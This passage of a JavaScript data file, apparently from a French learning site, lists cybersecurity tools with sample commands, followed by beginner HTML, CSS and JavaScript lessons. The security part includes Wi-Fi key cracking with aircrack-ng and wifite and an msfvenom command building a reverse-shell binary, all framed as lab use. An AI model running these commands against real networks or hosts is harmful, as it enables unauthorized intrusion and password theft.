    group("Wi-Fi (labo / réseau propre)", [
      makeItem("aircrack-ng", "Avancé", "Suite logicielle complète pour auditer la sécurité des clés WEP et WPA/WPA2-PSK.", 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap', "Tente de retrouver la clé pré-partagée en testant le dictionnaire contre le handshake capturé."),
      makeItem("airodump-ng", "Avancé", "Capture des trames 802.11 brutes et collecte des métadonnées de réseaux sans fil en mode moniteur.", 'sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon', "-c fixe le canal radio et --bssid isole le point d'accès d'entraînement autorisé."),
      makeItem("Wifite", "Intermédiaire", "Script Python automatisant les étapes d'audit des réseaux sans fil autorisés.", 'sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt', "--kill arrête les processus parasites susceptibles de perturber la carte Wi-Fi.")
    ]),
    group("Analyse réseau", [
      makeItem("Wireshark", "Débutant", "Analyseur graphique de protocoles réseau avec décodage complet des couches du modèle OSI.", 'sudo wireshark &', "Permet d'inspecter visuellement chaque trame, paquet TCP, requête HTTP ou échange DNS."),
      makeItem("tcpdump", "Intermédiaire", "Captureur de trafic réseau en ligne de commande pour filtrer et exporter des paquets (.pcap).", 'sudo tcpdump -i eth0 -nn -s0 -v "tcp port 80 or tcp port 443" -w trafic.pcap', "-nn évite les résolutions DNS/ports pour préserver les performances ; -w sauvegarde le fichier pour Wireshark.")
    ]),
    group("Exploitation", [
      makeItem("Metasploit msfconsole", "Intermédiaire", "Framework modulaire de référence pour tester et valider des failles de sécurité en labo.", 'msfconsole -q', "-q démarre la console en mode silencieux sans afficher la bannière de démarrage."),
      makeItem("msfvenom", "Avancé", "Générateur et encodeur de charges utiles (payloads) de la suite Metasploit.", 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o payload.elf', "Génère un binaire ELF de test 64 bits établissant une connexion inverse vers la machine de contrôle.")
    ]),
    group("Forensic", [
      makeItem("Autopsy", "Intermédiaire", "Interface graphique d'analyse judiciaire numérique (Digital Forensics) pour disques et images.", 'autopsy &', "Permet d'analyser les systèmes de fichiers, l'historique web, les e-mails et les fichiers supprimés."),
      makeItem("Binwalk", "Intermédiaire", "Outil d'analyse, d'extraction et de rétro-ingénierie d'images de firmwares et binaires.", 'binwalk -e -M firmware.bin', "-e extrait automatiquement les fichiers reconnus et -M parcourt récursivement les archives trouvées."),
      makeItem("Foremost", "Intermédiaire", "Programme de récupération de fichiers (file carving) basé sur les en-têtes et pieds de page.", 'foremost -t jpg,pdf,png -i image_disque.dd -o extraction/', "-t spécifie les formats de fichiers à rechercher et reconstituer à partir de l'image brute.")
    ]),
    group("Anonymat & sécurité", [
      makeItem("proxychains", "Intermédiaire", "Force les connexions TCP des programmes à transiter par une cascade de serveurs proxies.", 'proxychains4 -q curl https://icanhazip.com', "Achemine la requête curl via les mandataires définis dans /etc/proxychains4.conf."),
      makeItem("Tor", "Intermédiaire", "Service de routage en oignon chiffrant les échanges à travers un réseau décentralisé de relais.", 'sudo systemctl status tor', "Vérifie le fonctionnement du service Tor local écoutant sur le port SOCKS 9050."),
      makeItem("VPN", "Débutant", "Établit un tunnel chiffré sécurisé entre votre machine et une passerelle distante.", 'sudo openvpn --config client.ovpn', "Initialise une connexion OpenVPN à l'aide d'un fichier de configuration chiffré.")
    ]),
    group("Labs pour s'entraîner", [
      makeItem("TryHackMe", "Débutant", "Plateforme d'apprentissage guidée proposant des machines virtuelles pas à pas dans un navigateur.", 'sudo openvpn tryhackme.ovpn', "Connecte votre machine locale au réseau interne des laboratoires TryHackMe."),
      makeItem("Hack The Box", "Intermédiaire", "Plateforme d'entraînement pratique avancée avec challenges de cybersécurité et machines réalistes.", 'sudo openvpn lab_academy.ovpn', "Permet d'accéder aux environnements d'entraînement dédiés de HTB Academy."),
      makeItem("DVWA", "Débutant", "Application web PHP/MySQL volontairement vulnérable pour tester SQLi, XSS, CSRF en local.", 'docker run --rm -it -p 80:80 vulnerables/web-dvwa', "Lance une instance jetable et isolée de DVWA accessible sur http://localhost:80."),
      makeItem("Metasploitable", "Débutant", "Machine virtuelle Linux volontairement trouée pour tester légalement l'exploitation de failles.", 'ping -c 3 192.168.56.101', "Teste la liaison avec la VM Metasploitable configurée sur votre réseau privé virtuel isolé."),
      makeItem("OverTheWire", "Débutant", "Série de jeux de guerre (wargames) en SSH pour apprendre les commandes Linux de manière ludique.", 'ssh bandit0@bandit.labs.overthewire.org -p 2220', "Connecte au premier niveau de jeu Bandit (mot de passe initial : bandit0).")
    ])
  ],

  html: [
    group("Structure d'une page", [
      makeItem("DOCTYPE", "Débutant", "Déclaration obligatoire en tout début de document informant le navigateur du standard HTML5.", '<!doctype html>', "Active le mode de rendu standard moderne du navigateur et désactive le mode de rétrocompatibilité."),
      makeItem("html", "Débutant", "Élément racine contenant l'ensemble de la structure du document web.", '<html lang="fr">\n  <!-- Contenu de la page -->\n</html>', "L'attribut lang est indispensable pour les lecteurs d'écran et le référencement."),
      makeItem("head", "Débutant", "Conteneur des métadonnées, du titre, des polices et des liens vers les feuilles de style.", '<head>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n  <title>Titre de ma page</title>\n</head>', "Ces informations ne sont pas directement affichées dans la zone de lecture du navigateur."),
      makeItem("body", "Débutant", "Contient l'intégralité du contenu visible de la page web (textes, images, composants).", '<body>\n  <header>...</header>\n  <main>...</main>\n  <footer>...</footer>\n</body>', "Tout élément affiché à l'écran doit se trouver à l'intérieur de la balise body."),
      makeItem("Balises et attributs", "Débutant", "Briques fondamentales : une balise structure le contenu et ses attributs lui adjoignent des métadonnées.", '<a href="https://example.com" target="_blank" rel="noopener">Lien externe</a>', "L'élément <a> utilise les attributs href, target et rel pour définir sa cible et sécuriser la navigation.")
    ]),
    group("Texte et structure", [
      makeItem("Titres h1 à h6", "Débutant", "Définit les niveaux de hiérarchie des titres du document (h1 étant le titre principal unique).", '<h1>Grand Titre</h1>\n<h2>Section principale</h2>\n<h3>Sous-partie</h3>', "Les balises h1 à h6 structurent logiquement la page pour l'accessibilité et les moteurs de recherche."),
      makeItem("Paragraphe p", "Débutant", "Représente un bloc de texte formant un paragraphe de lecture.", '<p>Voici un paragraphe contenant des explications claires et concises.</p>', "Le navigateur applique automatiquement des marges verticales par défaut."),
      makeItem("Listes ul et ol", "Débutant", "Crée des listes non ordonnées à puces (ul) ou ordonnées numérotées (ol).", '<ul>\n  <li>Premier point</li>\n  <li>Deuxième point</li>\n</ul>\n<ol>\n  <li>Étape 1</li>\n  <li>Étape 2</li>\n</ol>', "Chaque élément de liste doit obligatoirement être encapsulé dans une balise <li>."),
      makeItem("Emphase strong et em", "Débutant", "Met en valeur du texte important (strong, en gras) ou avec insistance (em, en italique).", '<p>Attention : <strong>action irréversible</strong>. <em>Vérifiez bien</em> vos données.</p>', "Les lecteurs d'écran modifient l'intonation de voix sur ces balises sémantiques."),
      makeItem("Commentaires", "Débutant", "Ajoute des notes explicatives dans le code source qui ne seront pas affichées par le navigateur.", '<!-- Section temporaire de navigation -->\n<nav>...</nav>', "Visible dans le code source lors de l'inspection de page (ne jamais y placer de secrets).")
    ]),
    group("Liens et médias", [
      makeItem("Lien a", "Débutant", "Crée un lien hypertexte interne, externe, d'ancrage ou d'adresse e-mail.", '<a href="/cours/python.html">Parcours Python</a>\n<a href="#section2">Aller à la section 2</a>', "L'attribut href spécifie l'URL ou l'ancre de destination."),
      makeItem("Image img", "Débutant", "Insère une image dans la page avec texte alternatif d'accessibilité obligatoire.", '<img src="schema.svg" alt="Schéma de l\'architecture réseau" width="600" height="400" loading="lazy">', "loading='lazy' diffère le chargement des images hors-champ pour accélérer l'affichage."),
      makeItem("Audio et vidéo", "Intermédiaire", "Intègre des fichiers multimédias avec les contrôles natifs du navigateur.", '<video controls width="640">\n  <source src="demo.mp4" type="video/mp4">\n  Votre navigateur ne supporte pas la balise vidéo.\n</video>', "L'attribut controls affiche la barre de lecture, pause et volume."),
      makeItem("Chemins relatifs", "Débutant", "Localise une ressource par rapport à l'emplacement du fichier HTML courant.", '<img src="./images/logo.png" alt="Logo">\n<link rel="stylesheet" href="../css/style.css">', "./ désigne le dossier courant et ../ permet de remonter au dossier parent.")
    ]),
    group("HTML sémantique", [
      makeItem("header", "Débutant", "Représente l'en-tête introductif d'une page ou d'une section de contenu.", '<header>\n  <a href="/">Accueil</a>\n  <nav>...</nav>\n</header>', "Regroupe généralement le logo, la navigation principale ou le titre de section."),
      makeItem("nav", "Débutant", "Identifie spécifiquement la section regroupant les liens majeurs de navigation.", '<nav aria-label="Navigation principale">\n  <a href="/index.html">Accueil</a>\n  <a href="/web.html">Web</a>\n</nav>', "Aide les technologies d'assistance à identifier rapidement les menus."),
      makeItem("main", "Débutant", "Englobe le contenu central et exclusif de la page (unique par document).", '<main>\n  <h1>Guide de cybersécurité</h1>\n  <p>Contenu principal unique...</p>\n</main>', "Ne doit pas être imbriqué dans header, nav ou footer."),
      makeItem("section et article", "Débutant", "Définit une section thématique générale (section) ou un contenu autonome et réutilisable (article).", '<section aria-labelledby="titre-news">\n  <h2 id="titre-news">Actualités</h2>\n  <article>\n    <h3>Titre de l\'article</h3>\n    <p>Texte de l\'article...</p>\n  </article>\n</section>', "Structure la page de façon compréhensible pour les moteurs et lecteurs de flux RSS."),
      makeItem("footer", "Débutant", "Représente le pied de page d'un document ou d'une section.", '<footer>\n  <p>© 2026 CodeVally · Tous droits réservés.</p>\n</footer>', "Regroupe les mentions légales, copyrights et liens secondaires.")
    ]),
    group("Formulaires", [
      makeItem("form", "Débutant", "Délimite un formulaire interactif et configure la méthode et l'adresse de soumission.", '<form action="/api/recherche" method="GET">\n  <input type="search" name="q" placeholder="Rechercher...">\n  <button type="submit">Valider</button>\n</form>', "action indique l'URL cible et method précise le verbe HTTP (GET ou POST)."),
      makeItem("label et input", "Débutant", "Associe explicitement un libellé cliquable et accessible à un champ de saisie.", '<label for="champ-email">Adresse e-mail :</label>\n<input id="champ-email" type="email" name="email" required>', "Cliquer sur le texte du label donne automatiquement le focus au champ d'input associé."),
      makeItem("Types de champs", "Débutant", "Configure le comportement et le clavier mobile selon le type de donnée attendu.", '<input type="text" placeholder="Pseudo">\n<input type="password" placeholder="Mot de passe">\n<input type="number" min="1" max="100">\n<input type="checkbox" id="cgu">', "Adapte automatiquement les validations et claviers virtuels sur smartphone."),
      makeItem("button", "Débutant", "Bouton d'action déclenchant la soumission d'un formulaire ou un événement JavaScript.", '<button type="submit">Envoyer</button>\n<button type="button" onclick="fermer()">Annuler</button>', "Spécifie toujours type='button' hors soumission pour éviter les rechargements de page involontaires.")
    ])
  ],

  css: [
    group("Premiers styles", [
      makeItem("Règle CSS", "Débutant", "Structure fondamentale liant un sélecteur à un bloc de déclarations propriété: valeur.", 'p {\n  color: #1f2937;\n  font-size: 16px;\n  line-height: 1.5;\n}', "Chaque déclaration se termine par un point-virgule et s'applique aux éléments ciblés."),
      makeItem("Sélecteurs", "Débutant", "Cible les éléments HTML par balise, classe, identifiant ou attribut.", 'h1 { font-size: 2rem; }\n.carte { padding: 1rem; }\n#menu-principal { display: flex; }\ninput[type="text"] { border: 1px solid #ccc; }', "Permet de moduler précisément l'application des styles sur la page."),
      makeItem("Classes et identifiants", "Débutant", "Différencie le ciblage réutilisable avec une classe (.) du ciblage unique avec un ID (#).", '/* Cibler une classe (réutilisable à volonté) */\n.bouton-primaire {\n  background: #111318;\n  color: #ffffff;\n}\n\n/* Cibler un identifiant (unique par page) */\n#navigation-principale {\n  border-bottom: 1px solid #e5e5e5;\n}', "Privilégie les classes pour conserver une feuille de style modulaire et maintenable."),
      makeItem("Couleurs et unités", "Débutant", "Définit les teintes (hex, rgb, hsl) et les dimensions (rem, px, %, vh, vw).", 'body {\n  color: #0f172a;\n  background-color: hsl(210, 20%, 98%);\n  font-size: 1rem;       /* 16px selon le navigateur */\n  max-width: 80ch;      /* 80 caractères de large */\n}', "rem se base sur la racine du document (préférable aux px pour l'accessibilité des zooms).")
    ]),
    group("Texte et apparence", [
      makeItem("Polices", "Débutant", "Contrôle la famille typographique, la graisse, la hauteur de ligne et l'espacement.", 'body {\n  font-family: "Plus Jakarta Sans", sans-serif;\n  font-weight: 500;\n  line-height: 1.6;\n  letter-spacing: -0.02em;\n}', "Spécifie toujours une police de secours générique (sans-serif, serif ou monospace)."),
      makeItem("Marges et espacements", "Débutant", "Distingue la marge extérieure (margin) du rembourrage intérieur (padding).", '.carte {\n  margin: 1.5rem auto;  /* Espace extérieur pour centrer */\n  padding: 1.25rem;      /* Espace intérieur entre bord et contenu */\n}', "margin sépare deux éléments voisins, padding aère l'intérieur du conteneur."),
      makeItem("Bordures et ombres", "Débutant", "Dessine des contours, adoucit les angles et confère du relief visuel.", '.boite {\n  border: 1px solid #e2e8f0;\n  border-radius: 12px;\n  box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);\n}', "Combine bordure fine et ombre douce pour un rendu moderne et soigné."),
      makeItem(":hover et transitions", "Débutant", "Anime avec fluidité les changements d'état lors du survol de l'utilisateur.", 'button {\n  background-color: #2563eb;\n  transition: background-color 0.15s ease, transform 0.15s ease;\n}\nbutton:hover {\n  background-color: #1d4ed8;\n  transform: translateY(-2px);\n}', "transition rend l'interaction naturelle sans saut brusque de style.")
    ]),
    group("Disposition", [
      makeItem("Box model", "Débutant", "Modèle de boîte CSS régissant le calcul des dimensions (contenu, padding, bordure, marge).", '* {\n  box-sizing: border-box;\n}', "border-box inclut le padding et la bordure dans la largeur définie, évitant les débordements."),
      makeItem("Flexbox", "Débutant", "Modèle d'alignement et de distribution flexible sur un seul axe (ligne ou colonne).", '.barre {\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  gap: 1rem;\n}', "Idéal pour les barres de navigation, boutons composés et rangées d'éléments."),
      makeItem("CSS Grid", "Intermédiaire", "Système de disposition bidimensionnel en lignes et colonnes coordonnées.", '.grille {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));\n  gap: 1.25rem;\n}', "Crée une grille responsive qui s'adapte automatiquement à la largeur d'écran disponible."),
      makeItem("Position", "Intermédiaire", "Détermine le mode de placement d'un élément dans le flux ou par rapport à la fenêtre.", '.entete {\n  position: sticky;\n  top: 0;\n  z-index: 50;\n}', "sticky maintient l'élément visible en haut de l'écran lors du défilement.")
    ]),
    group("Responsive et accessibilité", [
      makeItem("Media queries", "Débutant", "Applique des blocs de règles conditionnels selon la taille ou les capacités de l'écran.", '@media (max-width: 768px) {\n  .grille {\n    grid-template-columns: 1fr;\n  }\n}', "Permet d'adapter l'affichage pour les smartphones et tablettes."),
      makeItem("Unités fluides", "Intermédiaire", "Adapte les grandeurs de manière proportionnelle avec clamp(), min(), max().", 'h1 {\n  font-size: clamp(1.75rem, 4vw, 3rem);\n}', "clamp(minimum, valeur_recommandee, maximum) garantit une taille harmonieuse sur tout écran."),
      makeItem(":focus-visible", "Débutant", "Affiche un contour net d'accessibilité uniquement lors de la navigation au clavier.", ':focus-visible {\n  outline: 2px solid #2563eb;\n  outline-offset: 2px;\n}', "Préserve la navigation au clavier sans afficher d'anneau disgracieux au clic de souris."),
      makeItem("Variables CSS", "Débutant", "Déclare des propriétés personnalisées réutilisables dans toute la feuille de style.", ':root {\n  --couleur-primaire: #2563eb;\n}\na {\n  color: var(--couleur-primaire);\n}', "Facilite la gestion des thèmes clair/sombre et l'harmonisation des couleurs.")
    ])
  ],

  javascript: [
    group("Bases du langage", [
      makeItem("const et let", "Débutant", "Déclare des variables avec portée de bloc ; const pour les valeurs fixes, let pour les variables réassignables.", 'const pi = 3.14159;\nlet score = 0;\nscore += 10;', "Évite l'ancien mot-clé 'var' pour prévenir les effets de bord et le hissage de variables."),
      makeItem("console.log()", "Débutant", "Affiche des données, objets ou avertissements dans la console d'outils de développement.", 'const nom = "Mina";\nconsole.log(`Utilisateur connecté : ${nom}`);\nconsole.table([{ id: 1, nom: "Alice" }]);', "Essentiel pour déboguer et vérifier la valeur des variables lors du développement."),
      makeItem("Types de données", "Débutant", "Manipule les 7 types primitifs (string, number, boolean, null, undefined, symbol, bigint) et les objets.", 'const texte = "JS";\nconst nombre = 42;\nconst vrai = true;\nconst rien = null;\nlet nonDefini;', "typeof permet de vérifier le type d'une variable à l'exécution."),
      makeItem("Opérateurs", "Débutant", "Effectue des calculs arithmétiques, comparaisons strictes (===) et opérations logiques (&&, ||, ??).", 'const egal = (10 === "10");     // false (types différents)\nconst repli = null ?? "defaut"; // "defaut"', "Utilise toujours l'égalité stricte === pour éviter les coercitions de types imprévues."),
      makeItem("Conditions", "Débutant", "Dirige le flux d'exécution selon la valeur d'une expression booléenne.", 'const note = 15;\nif (note >= 16) {\n  console.log("Très bien");\n} else if (note >= 10) {\n  console.log("Validé");\n} else {\n  console.log("À revoir");\n}', "Structure conditionnelle classique if / else if / else.")
    ]),
    group("Boucles et fonctions", [
      makeItem("Boucle for", "Débutant", "Répète un bloc de code un nombre déterminé de fois avec un compteur.", 'for (let i = 0; i < 5; i++) {\n  console.log(`Itération n°${i}`);\n}', "Contrôle précis avec initialisation, condition et incrémentation."),
      makeItem("Boucle for…of", "Débutant", "Itère directement sur les valeurs d'un tableau, d'une chaîne ou d'une collection itérable.", 'const fruits = ["pomme", "poire", "raisin"];\nfor (const fruit of fruits) {\n  console.log(fruit);\n}', "Syntaxe moderne et lisible sans gestion manuelle d'index."),
      makeItem("Fonction", "Débutant", "Déclaration de fonction standard avec mot-clé function, paramètres et valeur de retour.", 'function doubler(valeur) {\n  return valeur * 2;\n}\nconst resultat = doubler(21);', "Les déclarations avec function bénéficient du hissage (hoisting)."),
      makeItem("Fonction fléchée", "Débutant", "Syntaxe concise pour déclarer des fonctions, conservant la liaison lexicale de 'this'.", 'const multiplier = (a, b) => a * b;\nconst carre = (x) => x ** 2;', "Indispensable pour les fonctions courtes et les callbacks."),
      makeItem("Portée des variables", "Intermédiaire", "Règles d'accessibilité des variables : portée globale, de fonction ou de bloc { }.", 'if (true) {\n  let local = "visible ici seulement";\n}\n// console.log(local); -> ReferenceError', "let et const protègent contre les fuites de variables en dehors du bloc.")
    ]),
    group("Tableaux et objets", [
      makeItem("Tableaux", "Débutant", "Liste ordonnée d'éléments manipulable via de nombreuses méthodes intégrées.", 'const langages = ["Python", "JS"];\nlangages.push("Bash");       // Ajoute à la fin\nconst premier = langages.shift(); // Retire le premier', "push/pop ajoutent/retirent en fin de tableau ; unshift/shift au début."),
      makeItem("map()", "Intermédiaire", "Crée un nouveau tableau en appliquant une fonction de transformation à chaque élément.", 'const nombres = [1, 2, 3, 4];\nconst carres = nombres.map((n) => n * n);', "Ne modifie pas le tableau initial : carres vaut [1, 4, 9, 16]."),
      makeItem("filter()", "Intermédiaire", "Extrait un sous-ensemble d'éléments satisfaisant une condition booléenne.", 'const scores = [12, 5, 18, 9, 14];\nconst admis = scores.filter((s) => s >= 10);', "admis contient [12, 18, 14] ; tableau initial inchangé."),
      makeItem("Objets", "Débutant", "Collection de paires clé-valeur représentant des entités structurées.", 'const serveur = {\n  nom: "srv-web",\n  ip: "10.0.0.1",\n  ports: [80, 443]\n};\nconsole.log(serveur.nom);', "Accède aux propriétés par la notation point (.nom) ou crochet (['ip'])."),
      makeItem("Destructuration", "Intermédiaire", "Extrait facilement des propriétés d'objets ou des éléments de tableaux dans des variables distinctes.", 'const config = { hote: "localhost", port: 8080 };\nconst { hote, port } = config;\n\nconst coords = [48.8, 2.3];\nconst [lat, lng] = coords;', "Permet un code compact et explicite, très utilisé dans les fonctions.")
    ]),
    group("HTML et DOM", [
      makeItem("querySelector()", "Débutant", "Sélectionne le premier élément du DOM correspondant à un sélecteur CSS.", 'const bouton = document.querySelector("#btn-valider");\nconst elements = document.querySelectorAll(".carte");', "querySelectorAll renvoie une NodeList de tous les éléments correspondants."),
      makeItem("textContent", "Débutant", "Lit ou modifie le contenu textuel brut d'un élément HTML en toute sécurité.", 'const titre = document.querySelector("h1");\ntitre.textContent = "Bienvenue sur CodeVally";', "Préférable à innerHTML car insensible aux attaques d'injection XSS."),
      makeItem("classList", "Intermédiaire", "Manipule les classes CSS d'un élément (add, remove, toggle, contains).", 'const carte = document.querySelector(".carte");\ncarte.classList.add("active");\ncarte.classList.toggle("visible");', "Permet de modifier l'apparence visuelle sans manipuler directement l'attribut style."),
      makeItem("Événement click", "Débutant", "Attache un écouteur réagissant aux clics de l'utilisateur sur un élément.", 'const btn = document.querySelector("button");\nbtn.addEventListener("click", (event) => {\n  console.log("Bouton cliqué !", event.target);\n});', "addEventListener permet d'attacher plusieurs écouteurs sur un même élément.")
    ]),
    group("Asynchrone et stockage", [
      makeItem("Formulaire submit", "Intermédiaire", "Intercepte l'envoi d'un formulaire pour traiter les données en JavaScript sans rechargement.", 'const form = document.querySelector("form");\nform.addEventListener("submit", (e) => {\n  e.preventDefault(); // Annule le rechargement de page\n  const saisie = form.elements["recherche"].value;\n});', "e.preventDefault() est indispensable pour créer des Single Page Applications (SPA)."),
      makeItem("JSON", "Intermédiaire", "Méthodes standards de sérialisation (stringify) et désérialisation (parse) de données.", 'const donnees = { status: "ok", code: 200 };\nconst texte = JSON.stringify(donnees);\nconst objet = JSON.parse(texte);', "Format universel d'échange de données entre client et serveur."),
      makeItem("localStorage", "Intermédiaire", "Stocke des paires clé-valeur textuelles dans le navigateur de façon permanente.", 'localStorage.setItem("theme", "sombre");\nconst themeActuel = localStorage.getItem("theme");\n// localStorage.removeItem("theme");', "Persiste même après fermeture du navigateur (limité à ~5 Mo par domaine)."),
      makeItem("fetch()", "Intermédiaire", "Envoie des requêtes réseau asynchrones modernes basées sur les Promesses.", 'fetch("https://api.example.com/data")\n  .then((res) => res.json())\n  .then((data) => console.log(data))\n  .catch((err) => console.error("Erreur réseau :", err));', "API native remplaçant l'ancien objet XMLHttpRequest."),
      makeItem("async et await", "Intermédiaire", "Syntaxe moderne simplifiant l'écriture et la lecture du code asynchrone.", 'async function chargerDonnees() {\n  try {\n    const res = await fetch("/api/notions");\n    const data = await res.json();\n    return data;\n  } catch (err) {\n    console.error("Échec :", err);\n  }\n}', "Permet d'écrire du code asynchrone qui ressemble à du code synchrone.")
    ])
  ]
};

if (typeof window !== "undefined") {
  window.data = data;
}
if (typeof module !== "undefined" && module.exports) {
  module.exports = data;
}
